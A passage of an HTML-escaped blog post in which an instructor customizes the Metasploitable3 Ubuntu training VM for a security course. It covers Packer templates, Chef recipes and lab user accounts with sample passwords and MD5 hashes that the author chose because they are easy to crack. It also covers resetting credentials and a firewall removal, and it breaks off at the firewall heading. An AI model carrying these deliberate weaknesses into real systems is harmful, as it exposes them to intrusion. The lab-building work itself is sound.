6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Customizing Metasploitable3 Ubuntu Linux Version&lt;/h2&gt;
&lt;p&gt;The default configuration of Metasploitable3 is excellent for training and testing. However, when distributing this machine as an assignment, I wanted to set a variety of custom configurations including changing the default users, changing the hostname, changing the default user (vagrant) password, and turning off the firewall. This section discusses how to perform these changes, and indicates different files and configurations that can be performed.&lt;/p&gt;
&lt;h2 id=&quot;interesting-configuration-files&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#interesting-configuration-files&quot; aria-label=&quot;interesting configuration files permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Interesting Configuration Files&lt;/h2&gt;
&lt;p&gt;According to &lt;a href=&quot;https://www.packer.io/docs/templates/index.html&quot;&gt;HashiCorp&lt;/a&gt;, templates are JSON files that configure the various components of Packer in order to create one or more machine images. The Metasploitable3 project has a collection of Packer templates. For Linux there are three templates:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;packer/templates/ubuntu_1404.json (Normal)
packer/templates/pro/ubuntu_1404.json (Pro)
packer/templates/aws/ubuntu_1404_ctf_2017.json (CTF)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And, although not specifically on topic, there are two Packer templates for the Windows Server 2008 build:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;packer/templates/windows_2008_r2.json (Normal)
packer/templates/pro/windows_2008_r2.json (Pro)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, there are three Ubuntu Linux templates, that I refer to as: 1) Normal, 2) Pro and 3) CTF. The primary difference between the Normal and Pro templates is that there are no Chef recipes in the Pro template. I have not thoroughly tested, but it appears that no additional software or configuration (apart from installing vmtools) is performed. I think that since the Linux version is still under development, there is not a differentiation yet. When compared to the Windows Server version, the Pro template seems much more secure (from solely looking at the configuration files.)&lt;/p&gt;
&lt;p&gt;In this post, we are going to discuss and customize the &lt;strong&gt;Normal template&lt;/strong&gt; available in: &lt;code class=&quot;language-text&quot;&gt;packer/templates/ubuntu_1404.json&lt;/code&gt;. Listed below is a stripped-down version of the &lt;code class=&quot;language-text&quot;&gt;ubuntu_1404.json&lt;/code&gt;. Obviously, the file format is JSON. The first entry is named &lt;code class=&quot;language-text&quot;&gt;builders&lt;/code&gt; which specify what type of virtual machine platform to target. In the previous post, we build a virtual machine for VirtualBox, it seems that we could instead target VMWare. The next entry, named &lt;code class=&quot;language-text&quot;&gt;provisioners&lt;/code&gt; is very interesting. This entry is an array of objects that define the provisioners that will be used to install and configure software. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;builders&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;vmware-iso&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;virtualbox-iso&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;provisioners&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;type&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;chef-solo&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;cookbook_paths&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;{{template_dir}}/../../chef/cookbooks&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
      &lt;span class=&quot;token property&quot;&gt;&quot;run_list&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::vm_tools&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::users&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::mysql&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::apache_continuum&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::apache&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::php_545&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::phpmyadmin&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::proftpd&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::docker&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::samba&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::sinatra&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::unrealircd&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::chatbot&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::payroll_app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::readme_app&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::cups&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::drupal&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::knockd&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::iptables&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&quot;metasploitable::flags&quot;&lt;/span&gt;
      &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As we can see from the list above, this template uses &lt;code class=&quot;language-text&quot;&gt;chef-solo&lt;/code&gt; as a provisioner to install and configure software. There is a path specified to the &lt;em&gt;cookbooks&lt;/em&gt;, which are just Ruby programs. The &lt;em&gt;cookbook&lt;/em&gt; directory is located at: &lt;code class=&quot;language-text&quot;&gt;chef/cookbooks/metasploitable/&lt;/code&gt;. And within that specific folder is a subfolder named &lt;code class=&quot;language-text&quot;&gt;recipes&lt;/code&gt; that contains the code. I have never used Chef, but it is a very simple and relatable premise. To build the system there is a complete &lt;em&gt;cookbook&lt;/em&gt;. Each configuration is a &lt;em&gt;recipe&lt;/em&gt; in that &lt;em&gt;cookbook&lt;/em&gt;. Pretty simple stuff.&lt;/p&gt;
&lt;p&gt;If you wanted to disable a specific &lt;em&gt;recipe&lt;/em&gt; from the &lt;em&gt;cookbook&lt;/em&gt;, you could comment out the specific recipe (using a &lt;code class=&quot;language-text&quot;&gt;#&lt;/code&gt; character) or simply delete the line. It would be best practice to create a backup of the original file before deleting anything!&lt;/p&gt;
&lt;p&gt;When I built my Metasploitable3 Ubuntu Linux system for my Security course I completely removed a number of the &lt;em&gt;recipes&lt;/em&gt; including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;docker&lt;/code&gt;: This is a technology that students had not yet used&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;flags&lt;/code&gt;: I wanted to put in my own flags, that were simpler (and more fun!)&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;cups&lt;/code&gt;: I had no real reason for taking this out!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Looking back, I would have probably removed the &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; &lt;em&gt;recipe&lt;/em&gt; as well. In the end, I removed all the &lt;code class=&quot;language-text&quot;&gt;iptables&lt;/code&gt; rules manually, as the implementation of the firewall would make the assessment far too difficult for the level of the paper. The following subsections discuss some more interesting customizations I have performed.&lt;/p&gt;
&lt;h3 id=&quot;user-customization&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#user-customization&quot; aria-label=&quot;user customization permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;User Customization&lt;/h3&gt;
&lt;p&gt;The user &lt;em&gt;recipe&lt;/em&gt; file for user configuration (&lt;code class=&quot;language-text&quot;&gt;recipes/users.rb&lt;/code&gt;) points to another file that has the actual configuration properties of the users (&lt;code class=&quot;language-text&quot;&gt;attributes/users.rb&lt;/code&gt;). The user attribute file can be modified to specify different usernames, passwords and other configuration. An example of the file structure is below:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;default[:users][:leia_organa] = { 
    username: &apos;leia_organa&apos;,
    password: &apos;help_me_obiwan&apos;,
    password_hash: &apos;$1$N6DIbGGZ$LpERCRfi8IXlNebhQuYLK/&apos;,
    first_name: &apos;Leia&apos;,
    last_name: &apos;Organa&apos;,
    admin: true,
    salary: &apos;9560&apos; }

default[:users][:luke_skywalker] = { 
    username: &apos;luke_skywalker&apos;,
    password: &apos;like_my_father_beforeme&apos;,
    password_hash: &apos;$1$/7D55Ozb$Y/aKb.UNrDS2w7nZVq.Ll/&apos;,
    first_name: &apos;Luke&apos;,
    last_name: &apos;Skywalker&apos;,
    admin: true,
    salary: &apos;1080&apos;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Basically, each user has an entry which specifies basic user configuration including the username, password, password hash. This information can easily be modified. For example, below is the initial entry for the &lt;code class=&quot;language-text&quot;&gt;darth_vader&lt;/code&gt; user account:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;default[:users][:darth_vader] = { 
    username: &apos;darth_vader&apos;,
    password: &apos;Dark_syD3&apos;,
    password_hash: &apos;$1$rLuMkR1R$YHumHRxhswnfO7eTUUfHJ.&apos;,
    first_name: &apos;Darth&apos;,
    last_name: &apos;Vader&apos;,
    admin: false,
    salary: &apos;6666&apos;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And here is my modified version for the same &lt;code class=&quot;language-text&quot;&gt;darth_vader&lt;/code&gt; user account:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;default[:users][:darth_vader] = { 
    username: &apos;darth_vader&apos;,
    password: &apos;daddy_issues2277&apos;,
    password_hash: &apos;$1$dqkERFiQ$oMihN1usY.gnbemCa48Pk1&apos;,
    first_name: &apos;Anakin&apos;,
    last_name: &apos;Skywalker&apos;,
    admin: true,
    salary: &apos;10000&apos;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The only tricky part of this modification was to generate a password for the user. Since the password had changed for &lt;code class=&quot;language-text&quot;&gt;darth_vader&lt;/code&gt;, from &lt;code class=&quot;language-text&quot;&gt;Dark_syD3&lt;/code&gt; to &lt;code class=&quot;language-text&quot;&gt;daddy_issues2277&lt;/code&gt; a new hash is essential. Otherwise, the new password would not match the password stored in the Linux encrypted password file (&lt;code class=&quot;language-text&quot;&gt;/etc/shadow&lt;/code&gt;). I have never done this before, but a couple of Google searches found a simple solution using OpenSSL:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;thomasl@server:~$ openssl passwd -1 &quot;daddy_issues2277&quot;
$1$dqkERFiQ$oMihN1usY.gnbemCa48Pk1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;As you can see from the command and output above, the &lt;code class=&quot;language-text&quot;&gt;openssl&lt;/code&gt; tool can generate an MD5 hashed password, and generate a unique salt value… and format the output to adhere to the &lt;code class=&quot;language-text&quot;&gt;md5crypt&lt;/code&gt; syntax that is used many Linux distribution password files. This is the same format used in Ubuntu 14.04 that Metasploitable3 is built on. Once this value is calculated, it is easily copied/pasted into the user configuration file.&lt;/p&gt;
&lt;p&gt;I specifically choose MD5 as the passwords would be easier (read: faster) to crack. Unfortunately, the &lt;code class=&quot;language-text&quot;&gt;openssl&lt;/code&gt; tools does not support the SHA-512 algorithm so another solution is necessary. Here is a simple Python 3 snippet that will generate the correct hash syntax for the &lt;code class=&quot;language-text&quot;&gt;/etc/shadow&lt;/code&gt; file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;python3 &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;c &lt;span class=&quot;token string&quot;&gt;&apos;import crypt; print(crypt.crypt(&quot;daddy_issues2277&quot;, crypt.mksalt(crypt.METHOD_SHA512)))&apos;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In addition to usernames, passwords, and password hashes, there are other configurations in the users’ file. The &lt;code class=&quot;language-text&quot;&gt;admin&lt;/code&gt; setting specifies whether a user should have &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; access. This is an important choice, as a modification of this can greatly hinder (or help) pentests. Finally, the &lt;code class=&quot;language-text&quot;&gt;salary&lt;/code&gt; value is used in the &lt;code class=&quot;language-text&quot;&gt;payroll_app&lt;/code&gt; &lt;em&gt;recipe&lt;/em&gt; which is used to display the wages of specific users. From my experience, it is more for fun than anything else.&lt;/p&gt;
&lt;h3 id=&quot;live-customization&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#live-customization&quot; aria-label=&quot;live customization permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Live Customization&lt;/h3&gt;
&lt;p&gt;So far, we have only customized of the build process. It is very easy to customize some parts of the Metasploitable3 system in a live environment; for example, when running the built virtual machine in VirtualBox. If you are like me and are not an expert using Vagrant, Packer, and Chef, this is a highly suitable solution.&lt;/p&gt;
&lt;h4 id=&quot;changing-the-vagrant-password&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#changing-the-vagrant-password&quot; aria-label=&quot;changing the vagrant password permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Changing the vagrant password&lt;/h4&gt;
&lt;p&gt;By default, Metasploitable3 is configured with a user named: &lt;code class=&quot;language-text&quot;&gt;vagrant&lt;/code&gt; that is used to build the virtual machine. To keep things simple, the password for the account is also &lt;code class=&quot;language-text&quot;&gt;vagrant&lt;/code&gt;. However, the virtual machine cannot be deployed with these default credentials, as it is too easy to break. I have even witnessed other vagrant builds that use the same credentials and could log in without knowing anything about the system (these were not deployed, only in testing environments… but still!). The &lt;code class=&quot;language-text&quot;&gt;vagrant&lt;/code&gt; user configuration can be changed in the build process by editing the following files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;packer/http/preseed.cfg&lt;/code&gt; on the following lines:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;d-i passwd/user-fullname string vagrant
d-i passwd/username string vagrant
d-i passwd/user-password password vagrant
d-i passwd/user-password-again password vagrant&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;packer/templates/ubuntu_1404.json&lt;/code&gt; on the following lines:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&quot;ssh_username&quot;: &quot;vagrant&quot;,
&quot;ssh_password&quot;: &quot;vagrant&quot;,&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Vagrantfile&lt;/code&gt; on the following lines:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;config.ssh.username = &apos;vagrant&apos;
config.ssh.password = &apos;vagrant&apos;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, I have not fully tested this modification, but it is the only places in the code I have witnessed this coding. Given that, it is probably easier just changing the password in the live system. This is exceptionally simple. Login to the deployed virtual machine (after running &lt;code class=&quot;language-text&quot;&gt;vagrant up&lt;/code&gt;), and execute the following command:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo passwd vagrant&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;changing-the-hostname&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#changing-the-hostname&quot; aria-label=&quot;changing the hostname permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Changing the hostname&lt;/h4&gt;
&lt;p&gt;The hostname (or computer name) is a similar situation. It can, of course, be changed in both the live system and the build process. The only location I could discover that specifies the hostname configuration is in the &lt;code class=&quot;language-text&quot;&gt;Vagrantfile&lt;/code&gt; on the following line:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;ub1404.vm.hostname = &quot;metasploitable3-ub1404&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Again, it would be simpler to modify this property in the live system by editing the following two files:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;/etc/hosts
/etc/hostname&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;uninstalling-virtualbox-guest-additions&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#uninstalling-virtualbox-guest-additions&quot; aria-label=&quot;uninstalling virtualbox guest additions permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Uninstalling VirtualBox Guest Additions&lt;/h4&gt;
&lt;p&gt;I only used VirtualBox for the build process. After that, I export the virtual machine and import it into the VMWare vSphere platform. I know this sounds crazy. I don’t have a license for VMWare Workstation for Linux. Additionally, I noted that in the &lt;code class=&quot;language-text&quot;&gt;vmtools.rb&lt;/code&gt; &lt;em&gt;recipe&lt;/em&gt; there is no option for VMWare. Not sure if this would be problematic during the building process. Anyway, another good configuration to perform on a live system in removal of the VBoxGuestAdditions package. The following commands will achieve uninstallation of this package.
Uninstall VBox tools&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd /opt/VBoxGuestAdditions-&lt;version_number&gt;
sudo ./uninstall.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h4 id=&quot;reset-firewallturn-off-firewall&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#reset-firewallturn-off-firewall&quot; aria-label=&quot;reset firewallturn off firewall permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Reset firewall/turn off firewall&lt;/h4&gt;
